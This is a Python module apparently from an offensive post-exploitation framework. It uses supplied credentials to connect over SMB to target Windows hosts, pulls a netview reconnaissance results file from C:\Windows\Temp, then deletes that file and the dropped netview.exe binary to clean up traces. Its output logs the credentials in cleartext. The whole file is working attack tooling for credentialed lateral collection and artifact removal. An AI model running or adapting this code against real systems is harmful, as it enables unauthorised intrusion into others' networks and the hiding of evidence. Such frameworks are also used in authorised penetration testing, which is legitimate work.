"""

Downloads the netview results file, then deletes the result
file and the netview.exe binary.


All credit for Netview goes to Rob Fuller (@mubix)

    https://github.com/mubix/netview
    http://www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/


Module built by @harmj0y

"""

import time

import settings

from lib import command_methods
from lib import helpers
from lib import smb

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Netview.exe Download Results"
        self.description = "Downloads the netview result file and cleans everything up."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = { "out_file"  : ["netview.txt", "temporary output filename used"] }


    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        out_file = self.required_options["out_file"][0]

        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file 

        for target in self.targets:
 
            # grab the output file and delete it
            out = smb.getFile(target, username, password, out_file, delete=True)
            
            # delete the netview.exe binary
            smb.deleteFile(target, username, password, "C:\\Windows\\Temp\\netview.exe")
            
            # save the file off to the appropriate location
            saveFile = helpers.saveModuleFile(self, target, "netview.txt", out)

            if out != "":
                self.output += "[*] netview.exe results using creds '"+username+":"+password+"' on "+target+" stored at "+saveFile+"\n"
            else:
                self.output += "[!] netview.exe execution failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"

